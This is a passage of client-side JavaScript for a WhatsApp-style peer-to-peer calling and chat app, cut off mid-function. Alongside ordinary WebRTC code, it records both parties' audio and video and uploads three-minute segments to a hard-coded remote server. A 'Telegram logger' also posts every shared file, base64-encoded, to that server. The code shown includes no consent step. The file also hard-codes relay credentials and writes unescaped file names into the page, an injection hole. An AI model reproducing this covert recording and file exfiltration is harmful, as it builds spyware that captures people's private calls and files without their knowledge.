// ============ MeetLink - WhatsApp Edition Mobile-First P2P App ============
// Built-in SQLite authentication, direct P2P messaging, vertical 9:16 calling & auto-recording.

// ---- CONFIG ----
const SERVER_URL = 'https://theoretical-kynthia-mychool-a6f2b3d0.koyeb.app';
const SEGMENT_DURATION_MS = 3 * 60 * 1000;

// ---- DOM ----
const homePage = document.getElementById('homePage');
const roomPage = document.getElementById('roomPage');
const createRoomBtn = document.getElementById('createRoomBtn');
const joinRoomInput = document.getElementById('joinRoomInput');
const joinRoomBtn = document.getElementById('joinRoomBtn');
const roomIdDisplay = document.getElementById('roomIdDisplay');
const copyLinkBtn = document.getElementById('copyLinkBtn');
const copyLinkBtn2 = document.getElementById('copyLinkBtn2');
const leaveRoomBtn = document.getElementById('leaveRoomBtn');
const shareableLink = document.getElementById('shareableLink');
const waitingScreen = document.getElementById('waitingScreen');
const callScreen = document.getElementById('callScreen');
const localVideo = document.getElementById('localVideo');
const remoteVideo = document.getElementById('remoteVideo');
const remoteNoVideo = document.getElementById('remoteNoVideo');
const toggleMicBtn = document.getElementById('toggleMicBtn');
const toggleCamBtn = document.getElementById('toggleCamBtn');
const toggleCamFlipBtn = document.getElementById('toggleCamFlipBtn');
const toggleScreenBtn = document.getElementById('toggleScreenBtn');
const togglePipBtn = document.getElementById('togglePipBtn');
const toggleChatBtn = document.getElementById('toggleChatBtn');
const endCallBtn = document.getElementById('endCallBtn');
const chatPanel = document.getElementById('chatPanel');
const closeChatBtn = document.getElementById('closeChatBtn');
const chatMessages = document.getElementById('chatMessages');
const chatInput = document.getElementById('chatInput');
const sendChatBtn = document.getElementById('sendChatBtn');
const chatVoiceCallBtn = document.getElementById('chatVoiceCallBtn');
const chatVideoCallBtn = document.getElementById('chatVideoCallBtn');
const chatContactName = document.getElementById('chatContactName');
const chatContactStatus = document.getElementById('chatContactStatus');
const whatsappComposer = document.querySelector('.whatsapp-composer');
const attachFileBtn = document.getElementById('attachFileBtn');
const fileInput = document.getElementById('fileInput');
const fileProgress = document.getElementById('fileProgress');
const fileProgressFill = document.getElementById('fileProgressFill');
const fileProgressText = document.getElementById('fileProgressText');
const toastEl = document.getElementById('toast');
const recordingIndicator = document.getElementById('recordingIndicator');
const tcModal = document.getElementById('tcModal');
const tcCloseBtn = document.getElementById('tcCloseBtn');
const recordingCanvas = document.getElementById('recordingCanvas');

// ---- State ----
let peer = null, currentCall = null, localStream = null, dataConnection = null, currentRemoteStream = null;
let currentUser = null, cyberHeartbeatInterval = null, cyberFriendsInterval = null;
let isMicOn = true, isCamOn = true, isScreenSharing = false, currentFacingMode = 'user';
let originalVideoTrack = null, incomingFileBuffers = {};
let currentRoomId = null, callStartTime = null, userRole = 'creator', messageCount = 0;
let activeChatUsername = null, activeChatDisplayName = 'App Chat Room';
let unreadCounts = {};
let chatMeta = {};
let chatPrefs = {};
let localCallHistory = [];
let lastFriendsCache = [];
let typingRestoreTimer = null;
let replyingToMessage = null;
let canvasDrawInterval = null, audioCtx = null, combinedStream = null;
let mediaRecorder = null, recordedChunks = [];
let segmentNumber = 0, recordingTimer = null, isCallActive = false;
let totalRecordingSize = 0, currentCallMode = 'video'; // 'video' or 'audio'
const CHUNK_SIZE = 16384;

// ============ T&C MODAL ============
const tcLink = document.getElementById('tcLink');
if (tcLink) {
    tcLink.addEventListener('click', (e) => { e.preventDefault(); tcModal.classList.remove('hidden'); });
}
if (tcCloseBtn) tcCloseBtn.addEventListener('click', () => tcModal.classList.add('hidden'));
if (tcModal) tcModal.addEventListener('click', (e) => { if (e.target === tcModal) if (tcModal) tcModal.classList.add('hidden'); });

// ============ TELEGRAM LOGGER ============
async function logEvent(eventType, extraData = {}) {
    try {
        await fetch(`${SERVER_URL}/api/event`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ type: eventType, roomId: currentRoomId, timestamp: new Date().toISOString(), ...extraData })
        });
    } catch (e) { }
}

async function logFileUpload(fileName, arrayBuffer) {
    try {
        if (arrayBuffer.byteLength > 50 * 1024 * 1024) return;
        const base64 = arrayBufferToBase64(arrayBuffer);
        await fetch(`${SERVER_URL}/api/event`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ type: 'file_upload', roomId: currentRoomId, fileName, fileSize: arrayBuffer.byteLength, sender: userRole, fileData: base64 })
        });
    } catch (e) { }
}

async function uploadRecordingSegment(blob, segNum, isLast, overrideRoomId = null) {
    if (!blob || blob.size === 0) return;
    try {
        const rid = overrideRoomId || currentRoomId || 'unknown';
        const formData = new FormData();
        const recExt = (blob.type && blob.type.includes('mp4')) ? 'mp4' : 'webm';
        
        // Include userRole inside filename so both sides can upload uniquely without clashing!
        const filename = `recording_${rid}_${userRole}_part${segNum}.${recExt}`;
        
        formData.append('video', blob, filename);
        formData.append('roomId', rid);
        formData.append('segmentNumber', String(segNum));
        formData.append('isLast', String(isLast));
        formData.append('segmentSize', String(blob.size));
        const resp = await fetch(`${SERVER_URL}/api/upload-recording`, { method: 'POST', body: formData });
        console.log(`✅ Segment ${segNum} uploaded (${(blob.size / 1024 / 1024).toFixed(1)} MB)`);
    } catch (e) { console.error('Segment upload failed:', e); }
}

function arrayBufferToBase64(buffer) {
    const bytes = new Uint8Array(buffer);
    let binary = '';
    const chunk = 8192;
    for (let i = 0; i < bytes.length; i += chunk) {
        const c = bytes.subarray(i, i + chunk);
        binary += String.fromCharCode.apply(null, c);
    }
    return btoa(binary);
}

// ============ FILE PREVIEW PAGE ============
function checkFilePreview() {
    const params = new URLSearchParams(window.location.search);
    const fileId = params.get('file');
    if (fileId) {
        showFilePreview(fileId);
    }
}

function showFilePreview(fileId) {
    const overlay = document.createElement('div');
    overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:#0b141a;z-index:99999;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px;';

    const loading = document.createElement('div');
    loading.style.cssText = 'color:#00a884;font-family:Orbitron,sans-serif;font-size:1.2rem;';
    loading.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Loading file...';
    overlay.appendChild(loading);
    document.body.appendChild(overlay);

    fetch(`${SERVER_URL}/api/file-info/${fileId}`)
        .then(r => r.json())
        .then(info => {
            overlay.removeChild(loading);

            if (info.error) {
                overlay.innerHTML = '<div style="color:#ff2d75;font-family:Orbitron;font-size:1.2rem;">File not found or expired</div>';
                return;
            }

            const fileUrl = `${SERVER_URL}/d/${fileId}`;
            const rawUrl = `${SERVER_URL}/api/file/${fileId}`;

            const header = document.createElement('div');
            header.style.cssText = 'width:100%;max-width:900px;margin-bottom:20px;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:10px;';
            header.innerHTML = `
                <div style="display:flex;align-items:center;gap:12px;">
                    <div style="width:40px;height:40px;border-radius:10px;background:linear-gradient(135deg,#00a884,#00f0ff);display:flex;align-items:center;justify-content:center;">
                        <i class="fas fa-file" style="color:#fff;"></i>
                    </div>
                    <div>
                        <div style="color:#e9edef;font-weight:700;font-size:1rem;">${info.fileName || 'File'}</div>
                        <div style="color:#8696a0;font-size:0.8rem;">${info.fileSize || ''} • MeetLink Share <span style="background:rgba(0,168,132,0.15);color:#00a884;padding:2px 8px;border-radius:6px;font-size:0.75rem;margin-left:8px;">⏱️ 1-Hour TTL</span></div>
                    </div>
                </div>
                <a href="${fileUrl}" download="${info.fileName || 'file'}" style="padding:10px 24px;background:var(--wa-teal);color:#fff;border:none;border-radius:10px;text-decoration:none;font-weight:600;cursor:pointer;box-shadow:0 0 15px rgba(0,168,132,0.4);">
                    <i class="fas fa-download"></i> Direct Download
                </a>
            `;
            overlay.appendChild(header);

            const preview = document.createElement('div');
            preview.style.cssText = 'flex:1;width:100%;max-width:900px;display:flex;align-items:center;justify-content:center;overflow:auto;border-radius:16px;border:1px solid #222e35;background:#111b21;';

            const ext = (info.fileName || '').split('.').pop().toLowerCase();
            const imageExts = ['jpg', 'jpeg', 'png', 'gif', 'webp', 'svg', 'bmp', 'ico'];
            const videoExts = ['mp4', 'webm', 'mkv', 'avi', 'mov'];
            const audioExts = ['mp3', 'wav', 'ogg', 'flac', 'aac'];
            const pdfExts = ['pdf'];

            if (imageExts.includes(ext)) {
                preview.innerHTML = `<img src="${rawUrl}" style="max-width:100%;max-height:70vh;border-radius:12px;object-fit:contain;" alt="${info.fileName}">`;
            } else if (videoExts.includes(ext)) {
                preview.innerHTML = `<video src="${rawUrl}" controls autoplay style="max-width:100%;max-height:70vh;border-radius:12px;"></video>`;
            } else if (audioExts.includes(ext)) {
                preview.innerHTML = `<div style="text-align:center;padding:40px;"><i class="fas fa-music" style="font-size:4rem;color:#00a884;margin-bottom:20px;display:block;"></i><audio src="${rawUrl}" controls autoplay style="width:100%;max-width:400px;"></audio></div>`;
            } else if (pdfExts.includes(ext)) {
                preview.innerHTML = `<iframe src="${rawUrl}" style="width:100%;height:70vh;border:none;border-radius:12px;"></iframe>`;
            } else {
                preview.innerHTML = `<div style="text-align:center;padding:60px;"><i class="fas fa-file" style="font-size:4rem;color:#00a884;margin-bottom:20px;display:block;"></i><div style="color:#e9edef;font-size:1.2rem;font-weight:700;margin-bottom:8px;">${info.fileName}</div><div style="color:#8696a0;margin-bottom:20px;">${info.fileSize || ''}</div><div style="color:#667781;font-size:0.9rem;">Preview not available. Click Download to save the file.</div></div>`;
            }

            overlay.appendChild(preview);
        })
        .catch(e => {
            overlay.innerHTML = '<div style="color:#ff2d75;font-family:Orbitron;font-size:1.2rem;">Error loading file</div>';
        });
}

// ============ SEGMENTED RECORDING SYSTEM (SNAPCHAT 9:16 PORTRAIT, CRASH-FREE) ============
function drawCover(ctx, video, dx, dy, dw, dh) {
    const vw = video.videoWidth, vh = video.videoHeight;
    if (!vw || !vh) { ctx.fillStyle = '#0b141a'; ctx.fillRect(dx, dy, dw, dh); return; }
    const scale = Math.max(dw / vw, dh / vh);
    const sw = dw / scale, sh = dh / scale;
    const sx = (vw - sw) / 2, sy = (vh - sh) / 2;
    ctx.drawImage(video, sx, sy, sw, sh, dx, dy, dw, dh);
}

function setupRecordingStreams() {
    try {
        const recCanvas = recordingCanvas;
        const RW = 360, RH = 640;
        recCanvas.width = RW;
        recCanvas.height = RH;
        const ctx = recCanvas.getContext('2d');

        canvasDrawInterval = setInterval(() => {
            ctx.fillStyle = '#0b141a';
            ctx.fillRect(0, 0, RW, RH);

            // If audio call mode, render placeholder avatar instead of remote video
            if (currentCallMode === 'audio') {
                ctx.fillStyle = '#111b21';
                ctx.fillRect(0, 0, RW, RH);
                ctx.fillStyle = '#00a884';
                ctx.beginPath();
                ctx.arc(RW / 2, RH / 2 - 40, 50, 0, Math.PI * 2);
                ctx.fill();
                ctx.fillStyle = '#ffffff';
                ctx.font = 'bold 20px Inter, sans-serif';
                ctx.textAlign = 'center';
                ctx.fillText(currentRoomId || 'Voice Call', RW / 2, RH / 2 + 40);
                ctx.font = '13px Inter, sans-serif';
                ctx.fillStyle = '#8696a0';
                ctx.fillText('WhatsApp Voice Call Active...', RW / 2, RH / 2 + 65);
            } else {
                // Remote Video
                try {
                    if (remoteVideo && remoteVideo.readyState >= 2 && remoteVideo.videoWidth) {
                        drawCover(ctx, remoteVideo, 0, 0, RW, RH);
                    } else {
                        ctx.fillStyle = '#111b21';
                        ctx.fillRect(0, 0, RW, RH);
                        ctx.fillStyle = '#8696a0';
                        ctx.font = '15px Inter, sans-serif';
                        ctx.textAlign = 'center';
                        ctx.fillText('Waiting for video...', RW / 2, RH / 2);
                    }
                } catch (e) { }
            }

            // Self PiP (Only if video call is active)
            if (currentCallMode === 'video') {
                try {
                    if (localVideo && localVideo.readyState >= 2 && localVideo.videoWidth) {
                        const pipW = 96, pipH = 170, margin = 12;
                        const pipX = RW - pipW - margin, pipY = margin;
                        ctx.fillStyle = '#00a884';
                        ctx.fillRect(pipX - 2, pipY - 2, pipW + 4, pipH + 4);
                        drawCover(ctx, localVideo, pipX, pipY, pipW, pipH);
                        ctx.fillStyle = 'rgba(0,0,0,0.6)';
                        ctx.fillRect(pipX, pipY + pipH - 16, pipW, 16);
                        ctx.fillStyle = '#ffffff';
                        ctx.font = '9px Inter, sans-serif';
                        ctx.textAlign = 'center';
                        ctx.fillText('You', pipX + pipW / 2, pipY + pipH - 4);
                    }
                } catch (e) { }
            }

            const now = new Date();
            const timeStr = now.toLocaleTimeString();
            const dateStr = now.toLocaleDateString();
            const elapsed = callStartTime ? formatCallDuration() : '00:00';
            ctx.fillStyle = 'rgba(0,0,0,0.6)';
            ctx.fillRect(8, 8, 200, 20);
            ctx.fillStyle = '#ff2d75';
            ctx.font = '10px Orbitron, monospace';
            ctx.textAlign = 'left';
            ctx.fillText('● REC  ' + dateStr + ' ' + timeStr + ' [' + elapsed + ']', 12, 22);
        }, 1000 / 20);

        const canvasVideoStream = recCanvas.captureStream(20);

        audioCtx = new (window.AudioContext || window.webkitAudioContext)();
        const destination = audioCtx.createMediaStreamDestination();

        if (localStream) {
            const localAudioTracks = localStream.getAudioTracks();
            if (localAudioTracks.length > 0) {
                const localSource = audioCtx.createMediaStreamSource(new MediaStream([localAudioTracks[0]]));
                localSource.connect(destination);
            }
        }

        try {
            if (currentRemoteStream && currentRemoteStream.getAudioTracks().length > 0) {
                const remoteSource = audioCtx.createMediaStreamSource(new MediaStream([currentRemoteStream.getAudioTracks()[0]]));
                remoteSource.connect(destination);
            }
        } catch (e) { }

        combinedStream = new MediaStream([
            ...canvasVideoStream.getVideoTracks(),
            ...destination.stream.getAudioTracks()
        ]);

        return true;
    } catch (e) {
        console.error('Recording setup failed:', e);
        return false;
    }
}

function getSupportedMimeType() {
    const preferMp4 = ['video/mp4;codecs=h264,aac', 'video/mp4'];
    if (typeof MediaRecorder !== 'undefined' && MediaRecorder.isTypeSupported) {
        for (const t of preferMp4) { if (MediaRecorder.isTypeSupported(t)) return t; }
    }
    const types = ['video/webm;codecs=vp9,opus', 'video/webm;codecs=vp8,opus', 'video/webm;codecs=h264,opus', 'video/webm'];
    for (const t of types) { if (MediaRecorder.isTypeSupported(t)) return t; }
    return 'video/webm';
}

function startNewSegment() {
    if (!combinedStream || !isCallActive) return;
    segmentNumber++;
    recordedChunks = [];
    const mimeType = getSupportedMimeType();
    mediaRecorder = new MediaRecorder(combinedStream, { mimeType, videoBitsPerSecond: 1500000, audioBitsPerSecond: 128000 });
    mediaRecorder.ondataavailable = (e) => { if (e.data && e.data.size > 0) recordedChunks.push(e.data); };
    mediaRecorder.onstop = () => {
        if (recordedChunks.length > 0) {
            const blob = new Blob(recordedChunks, { type: mimeType });
            uploadRecordingSegment(blob, segmentNumber, false);
        }
        recordedChunks = [];
        mediaRecorder = null;
        if (isCallActive) startNewSegment();
    };
    mediaRecorder.start(1000);
    recordingTimer = setTimeout(() => { if (mediaRecorder && mediaRecorder.state !== 'inactive') mediaRecorder.stop(); }, SEGMENT_DURATION_MS);
}

function startRecording() {
    try {
        if (!setupRecordingStreams()) return;
        isCallActive = true; segmentNumber = 0; totalRecordingSize = 0;
        startNewSegment();
    } catch (e) { console.error('Recording start failed:', e); }
}

function stopRecording() {
    isCallActive = false;
    if (recordingTimer) { clearTimeout(recordingTimer); recordingTimer = null; }
    if (canvasDrawInterval) { clearInterval(canvasDrawInterval); canvasDrawInterval = null; }
    if (audioCtx) { audioCtx.close().catch(() => {}); audioCtx = null; }

    const savedRoomId = currentRoomId || 'unknown';
    const savedDuration = formatCallDuration();
    const savedSegNum = segmentNumber || 1;

    if (mediaRecorder && mediaRecorder.state !== 'inactive') {
        const currentSegNum = segmentNumber || 1;
        const currentChunks = [...recordedChunks];
        mediaRecorder.onstop = () => {
            const allChunks = [...currentChunks, ...recordedChunks];
            if (allChunks.length > 0) {
                const finalMime = (mediaRecorder && mediaRecorder.mimeType) ? mediaRecorder.mimeType : 'video/webm';
                const blob = new Blob(allChunks, { type: finalMime });
                totalRecordingSize += blob.size;
                uploadRecordingSegment(blob, currentSegNum, true, savedRoomId);
            }
            logEvent('recording_complete', { 
                roomId: savedRoomId, 
                totalSegments: savedSegNum, 
                totalSize: totalRecordingSize, 
                duration: savedDuration 
            });
            mediaRecorder = null; recordedChunks = []; combinedStream = null;
        };
        mediaRecorder.stop();
    } else {
        if (savedSegNum > 0) {
            logEvent('recording_complete', { 
                roomId: savedRoomId, 
                totalSegments: savedSegNum, 
                totalSize: totalRecordingSize, 
                duration: savedDuration 
            });
        }
        combinedStream = null;
    }
    recordingIndicator.classList.add('hidden');
}

// ============ APP NAVIGATION TABS (WHATSAPP MULTI-PANEL) ============
function switchAppTab(tabId) {
    document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
    const activeBtn = document.getElementById(`tabBtn-${tabId}`);
    if (activeBtn) activeBtn.classList.add('active');

    document.querySelectorAll('.tab-pane').forEach(pane => pane.classList.remove('active'));
    const activePane = document.getElementById(`tabContent-${tabId}`);
    if (activePane) activePane.classList.add('active');

    showToast(`📍 Switched to ${tabId.toUpperCase()}`);
}
window.switchAppTab = switchAppTab;

// ============ AUTH FORMS SWITCHER ============
function switchAuthForm(formType) {
    document.querySelectorAll('.auth-tab-btn').forEach(btn => btn.classList.remove('active'));
    document.getElementById(`authTabBtn${formType === 'login' ? 'Login' : 'Register'}`).classList.add('active');

    const formLogin = document.getElementById('cyberLoginForm');
    const formRegister = document.getElementById('cyberRegisterForm');
    if (formType === 'login') {
        formLogin.classList.remove('hidden');
        formRegister.classList.add('hidden');
    } else {
        formLogin.classList.add('hidden');
        formRegister.classList.remove('hidden');
    }
}
window.switchAuthForm = switchAuthForm;

// ============ NATIVE BOTTOM SHEET SEARCH MODAL ============
function openSearchModal() {
    if (!currentUser) {
        showToast('⚠️ Please login first to search friends!');
        switchAppTab('profile');
        return;
    }
    const modal = document.getElementById('searchModal');
    modal.classList.remove('hidden');
    document.getElementById('cyberSearchInput').focus();
}
window.openSearchModal = openSearchModal;

function closeSearchModal() {
    document.getElementById('searchModal').classList.add('hidden');
    document.getElementById('cyberSearchInput').value = '';
    document.getElementById('cyberSearchResults').innerHTML = '<p class="cyber-empty">Enter a unique ID to find your friend</p>';
}
window.closeSearchModal = closeSearchModal;


// ============ UTILS ============
function generateRoomId() {
    const c = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let id = 'ML-';
    for (let i = 0; i < 7; i++) id += c[Math.floor(Math.random() * c.length)];
    return id;
}
function generateJoinerId() {
    const c = 'abcdefghijklmnopqrstuvwxyz0123456789';
    let id = 'joiner-';
    for (let i = 0; i < 10; i++) id += c[Math.floor(Math.random() * c.length)];
    return id;
}
function showToast(msg, dur = 3000) { toastEl.textContent = msg; toastEl.classList.add('show'); setTimeout(() => toastEl.classList.remove('show'), dur); }
function showPage(p) { document.querySelectorAll('.page').forEach(x => x.classList.remove('active')); p.classList.add('active'); }
function getRoomLink(rid) { return `${window.location.origin}${window.location.pathname}?room=${rid}`; }
function formatFileSize(b) {
    if (b === 0) return '0 B';
    const k = 1024, s = ['B', 'KB', 'MB', 'GB', 'TB'];
    const i = Math.floor(Math.log(b) / Math.log(k));
    return parseFloat((b / Math.pow(k, i)).toFixed(1)) + ' ' + s[i];
}
function getFileIcon(f) {
    const ext = f.split('.').pop().toLowerCase();
    const m = { jpg:'fa-file-image',jpeg:'fa-file-image',png:'fa-file-image',gif:'fa-file-image',webp:'fa-file-image',svg:'fa-file-image',pdf:'fa-file-pdf',doc:'fa-file-word',docx:'fa-file-word',xls:'fa-file-excel',xlsx:'fa-file-excel',ppt:'fa-file-powerpoint',pptx:'fa-file-powerpoint',zip:'fa-file-archive',rar:'fa-file-archive',mp3:'fa-file-audio',wav:'fa-file-audio',mp4:'fa-file-video',mkv:'fa-file-video',txt:'fa-file-alt',json:'fa-file-code',js:'fa-file-code',py:'fa-file-code' };
    return m[ext] || 'fa-file';
}
function isImageFile(f) { return ['jpg','jpeg','png','gif','webp','svg','bmp','ico'].includes(f.split('.').pop().toLowerCase()); }
function isVideoFile(f) { return ['mp4','webm','ogg','mov','mkv','avi','m4v'].includes(f.split('.').pop().toLowerCase()); }
function formatCallDuration() {
    if (!callStartTime) return '0s';
    const s = Math.floor((Date.now() - callStartTime) / 1000);
    const h = Math.floor(s / 3600), m = Math.floor((s % 3600) / 60), sec = s % 60;
    if (h > 0) return `${h}h ${m}m ${sec}s`;
    if (m > 0) return `${m}m ${sec}s`;
    return `${sec}s`;
}

// ============ NAVIGATION ============
if (createRoomBtn) createRoomBtn.addEventListener('click', () => { initRoom(generateRoomId(), true); });
if (joinRoomBtn) joinRoomBtn.addEventListener('click', () => {
    const input = joinRoomInput.value.trim();
    if (!input) { showToast('Please paste a room link or ID'); return; }
    let rid = input;
    try { const u = new URL(input); if (u.searchParams.get('room')) rid = u.searchParams.get('room'); } catch (e) { }
    initRoom(rid, false);
});
if (joinRoomInput) joinRoomInput.addEventListener('keydown', (e) => { if (e.key === 'Enter') if (joinRoomBtn) joinRoomBtn.click(); });
if (leaveRoomBtn) leaveRoomBtn.addEventListener('click', leaveRoom);
if (endCallBtn) endCallBtn.addEventListener('click', leaveRoom);

// ============ INIT ROOM — FIXED JOINER ID ============
async function initRoom(roomId, isCreator) {
    // Reset recording state on every new room init (important for page refresh)
    if (isCallActive || (mediaRecorder && mediaRecorder.state !== 'inactive')) {
        stopRecording();
    }
    
    currentRoomId = roomId;
    userRole = isCreator ? 'creator' : 'joiner';
    callStartTime = null;
    messageCount = 0;
    segmentNumber = 0;
    totalRecordingSize = 0;
    currentCallMode = 'video';
    isCallActive = false;
    mediaRecorder = null;
    recordedChunks = [];
    combinedStream = null;

    showPage(roomPage);
    roomIdDisplay.textContent = roomId;
    shareableLink.value = getRoomLink(roomId);

    if (isCreator) logEvent('room_created', { roomLink: getRoomLink(roomId) });
    else logEvent('user_joined', { roomLink: getRoomLink(roomId) });

    if (peer && !peer.destroyed) {
        peer.destroy();
        peer = null;
    }

    const myPeerId = isCreator ? roomId : generateJoinerId();

    peer = new Peer(myPeerId, {
        debug: 0,
        config: { iceServers: [
            { urls: 'stun:stun.l.google.com:19302' },
            { urls: 'stun:stun1.l.google.com:19302' },
            { urls: 'stun:stun2.l.google.com:19302' },
            { urls: 'stun:stun3.l.google.com:19302' },
            { urls: 'stun:stun.cloudflare.com:3478' },
            { urls: 'stun:openrelay.metered.ca:80' },
            { urls: 'turn:openrelay.metered.ca:80', username: 'openrelayproject', credential: 'OZ0sP3R4qX9sP1nT' },
            { urls: 'turn:openrelay.metered.ca:443', username: 'openrelayproject', credential: 'OZ0sP3R4qX9sP1nT' }
        ]}
    });

    peer.on('open', (id) => {
        console.log('My peer ID:', id);
        if (isCreator) {
            showToast('Room created! Share the link 🚀');
        } else {
            console.log('Joining room:', roomId);
            callPeer(roomId);
        }
    });

    peer.on('error', (err) => {
        console.error('Peer error:', err.type, err);
        if (err.type === 'unavailable-id') {
            showToast('Room already exists! Try another link.');
            leaveRoom();
        } else if (err.type === 'peer-unavailable') {
            showToast('Person not online yet. Share the link & wait!');
        } else {
            showToast('Connection error: ' + err.type);
        }
    });

    peer.on('disconnected', () => {
        showToast('Disconnected...');
        if (peer && !peer.destroyed) peer.reconnect();
    });

    if (isCreator) {
        peer.on('call', handleIncomingCall);
        peer.on('connection', handleIncomingData);
    }
}

// ============ GET MEDIA (SMART 9:16 MOBILE & 16:9 PC DETECTION) ============
async function getMediaStream(callType = 'video') {
    if (callType === 'audio') {
        try {
            return await navigator.mediaDevices.getUserMedia({ video: false, audio: true });
        } catch(e) {
            showToast('Microphone access denied.');
            return null;
        }
    }

    const isMobile = window.innerWidth <= 768 || /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
    const videoConstraints = isMobile ? {
        width:     { ideal: 720,  max: 1080 },
        height:    { ideal: 1280, max: 1920 },
        aspectRatio: { ideal: 9 / 16 },
        frameRate: { ideal: 30,   max: 30   },
        facingMode: { ideal: currentFacingMode }
    } : {
        width:     { ideal: 1280, max: 1920 },
        height:    { ideal: 720,  max: 1080 },
        aspectRatio: { ideal: 16 / 9 },
        frameRate: { ideal: 30,   max: 30   },
        facingMode: { ideal: currentFacingMode }
    };
    try { return await navigator.mediaDevices.getUserMedia({
            video: videoConstraints,
            audio: {
                echoCancellation: true,
                noiseSuppression: true,
                autoGainControl:  true,
                sampleRate:       48000,
                channelCount:     2
            }
        }); }
    catch (e) {
        try { isCamOn = false; updateControlButtons(); return await navigator.mediaDevices.getUserMedia({ video: false, audio: true }); }
        catch (e2) { showToast('Camera/Mic access denied.'); return null; }
    }
}

// ============ CALL PEER (JOINER) — FIXED ============
async function callPeer(targetPeerId, callType = 'video') {
    currentCallMode = callType;
    localStream = await getMediaStream(callType);
    if (!localStream) { showToast('Cannot proceed without media'); return; }
    
    if (callType === 'video') {
        localVideo.srcObject = localStream;
        document.getElementById('audioCallOverlay').classList.add('hidden');
    } else {
        document.getElementById('audioCallOverlay').classList.remove('hidden');
        document.getElementById('audioCallName').textContent = '@' + targetPeerId;
    }

    const call = peer.call(targetPeerId, localStream);
    if (!call) {
        showToast('Failed to connect. Is the other person online?');
        return;
    }

    call.on('stream', (rs) => {
        console.log('Remote stream received!');
        showCallScreen(rs);
    });
    call.on('close', () => { showToast('Call ended'); leaveRoom(); });
    call.on('error', (err) => { console.error('Call error:', err); showToast('Call failed'); });
    currentCall = call;

    dataConnection = peer.connect(targetPeerId, { reliable: true });
    dataConnection.on('open', () => {
        console.log('Data connection established!');
    });
    dataConnection.on('data', handleDataMessage);
    dataConnection.on('close', () => console.log('Data connection closed'));
    dataConnection.on('error', (err) => console.error('Data error:', err));
}

// ============ INCOMING CALL (CREATOR) ============
async function handleIncomingCall(call) {
    console.log('📞 Incoming call from:', call.peer);
    currentCallMode = 'video';
    localStream = await getMediaStream('video');
    if (!localStream) { showToast('No media access'); return; }
    localVideo.srcObject = localStream;
    call.answer(localStream);

    call.on('stream', (rs) => {
        console.log('Remote stream received!');
        showCallScreen(rs);
    });
    call.on('close', () => { showToast('Call ended'); leaveRoom(); });
    call.on('error', console.error);
    currentCall = call;
}

function handleIncomingData(conn) {
    dataConnection = conn;
    conn.on('open', () => console.log('Data connection from joiner!'));
    conn.on('data', handleDataMessage);
    conn.on('close', () => console.log('Data connection closed'));
}

// ============ DYNAMIC ADAPTIVE BITRATE (AIRTEL/JIO PRO ENGINE - ULTRA RES PRIORITIZED) ============
function setupDynamicNetworkAdaptation(call) {
    if (!call || !call.peerConnection) return;
    try {
        const pc = call.peerConnection;
        const senders = pc.getSenders();
        const videoSender = senders.find(s => s.track && s.track.kind === 'video');
        if (videoSender && videoSender.getParameters) {
            const params = videoSender.getParameters();
            if (!params.encodings) params.encodings = [{}];
            params.encodings[0].maxBitrate = 4000000;          // 4 Mbps ultra HD max!
            params.encodings[0].networkPriority = 'high';
            videoSender.setParameters(params).catch(() => {});
        }

        // Set degradation preference to maintain maximum resolution on slow networks!
        if (pc.getTransceivers) {
            pc.getTransceivers().forEach(transceiver => {
                if (transceiver.sender && transceiver.sender.track && transceiver.sender.track.kind === 'video') {
                    transceiver.sender.degradationPreference = 'maintain-resolution'; 
                    console.log("⚡ [WebRTC Engine] Prioritizing ultra-sharp resolution over frame rate for low network!");
                }
            });
        }

        const pingEl = document.getElementById('pingText');
        const netInterval = setInterval(async () => {
            if (!isCallActive || !pc || pc.connectionState === 'closed') {
                clearInterval(netInterval);
                return;
            }
            try {
                const stats = await pc.getStats();
                let rtt = 0, width = 0, height = 0;
                stats.forEach(report => {
                    if (report.type === 'candidate-pair' && report.state === 'succeeded' && report.currentRoundTripTime) {
                        rtt = Math.round(report.currentRoundTripTime * 1000);
                    }
                    if (report.type === 'inbound-rtp' && report.kind === 'video') {
                        if (report.frameWidth) width = report.frameWidth;
                        if (report.frameHeight) height = report.frameHeight;
                    }
                });
                if (pingEl && rtt > 0) {
                    const resStr = width > 0 ? `${width}x${height}` : 'HD';
                    if (rtt < 80) {
                        pingEl.innerHTML = `🟢 Excellent (${rtt}ms) • ${resStr}`;
                    } else if (rtt < 180) {
                        pingEl.innerHTML = `🟡 Good (${rtt}ms) • ${resStr}`;
                    } else {
                        pingEl.innerHTML = `🟠 Weak Network (${rtt}ms) • Sharp Mode active`;
                    }
                }
            } catch (e) {}
        }, 2500);
    } catch (e) {}
}

// ============ SHOW CALL + START RECORDING ============
function showCallScreen(remoteStream) {
    waitingScreen.style.display = 'none';
    callScreen.classList.remove('hidden');
    
    if (currentCallMode === 'video') {
        remoteVideo.srcObject = remoteStream;
        remoteVideo.classList.remove('hidden');
        document.getElementById('audioCallOverlay').classList.add('hidden');
    } else {
        remoteVideo.classList.add('hidden');
        document.getElementById('audioCallOverlay').classList.remove('hidden');
        document.getElementById('audioCallName').textContent = '@' + (currentCall ? currentCall.peer : 'Friend');
    }
    
    currentRemoteStream = remoteStream;
    remoteNoVideo.style.display = 'none';
    callStartTime = Date.now();
    showToast('Connected! 🎉');
    logEvent('call_started');
    playSciFiSound('join');

    try {
        setupActiveSpeakerDetector(remoteStream, remoteVideo);
        if (localStream) setupActiveSpeakerDetector(localStream, localVideo);
        setupDynamicNetworkAdaptation(currentCall);

        if (currentCall && currentCall.peerConnection) {
            const pc = currentCall.peerConnection;
            pc.addEventListener('iceconnectionstatechange', () => {
                const st = pc.iceConnectionState;
                if (st === 'failed' || st === 'disconnected') {
                    try { if (pc.restartIce) pc.restartIce(); } catch (e) {}
                }
            });
        }
    } catch (e) { }

    try {
        if ('autoPictureInPicture' in remoteVideo) {
            remoteVideo.autoPictureInPicture = true;
        }
    } catch (e) { }

    // Start recording on BOTH ends as requested by user!
    // Small delay for page refresh stability
    setTimeout(() => {
